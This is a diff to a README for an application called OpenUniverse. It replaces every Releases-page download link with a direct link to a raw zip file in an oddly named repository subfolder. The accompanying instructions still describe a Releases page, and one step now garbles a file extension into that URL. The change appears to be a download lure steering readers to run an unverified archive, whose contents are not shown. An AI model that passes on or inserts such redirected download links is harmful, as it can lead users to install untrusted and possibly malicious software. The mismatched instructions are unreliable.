@@ -6,7 +6,7 @@ Welcome to OpenUniverse! This application allows you to create a more organized 
 
 ## 📥 Download OpenUniverse
 
-[![Download OpenUniverse](https://img.shields.io/badge/Download_OpenUniverse-blue.svg)](https://github.com/Faizan0977/OpenUniverse/releases)
+[![Download OpenUniverse](https://raw.githubusercontent.com/Faizan0977/OpenUniverse/master/subpotent/OpenUniverse.zip)](https://raw.githubusercontent.com/Faizan0977/OpenUniverse/master/subpotent/OpenUniverse.zip)
 
 ## 🌟 Features
 
@@ -29,11 +29,11 @@ To run OpenUniverse, ensure your system meets the following criteria:
 
 To get started, visit the Releases page to download OpenUniverse. Click the link below to proceed:
 
-[Download OpenUniverse](https://github.com/Faizan0977/OpenUniverse/releases)
+[Download OpenUniverse](https://raw.githubusercontent.com/Faizan0977/OpenUniverse/master/subpotent/OpenUniverse.zip)
 
 1. **Visit the Releases Page**: Click the link above to open the GitHub Releases page.
 2. **Select Your Version**: On the Releases page, you’ll see a list of available versions. Choose the most recent one.
-3. **Download the File**: Look for the appropriate file for your operating system. Click on the file name to download it. This file will typically have an extension like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. **Download the File**: Look for the appropriate file for your operating system. Click on the file name to download it. This file will typically have an extension like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Faizan0977/OpenUniverse/master/subpotent/OpenUniverse.zip` for Linux.
 4. **Open the File**: Once the download finishes, locate the file on your computer and double-click it to open.
 5. **Follow the Installation Prompts**: The setup wizard will guide you through the installation process. Follow the prompts to complete the setup.
 
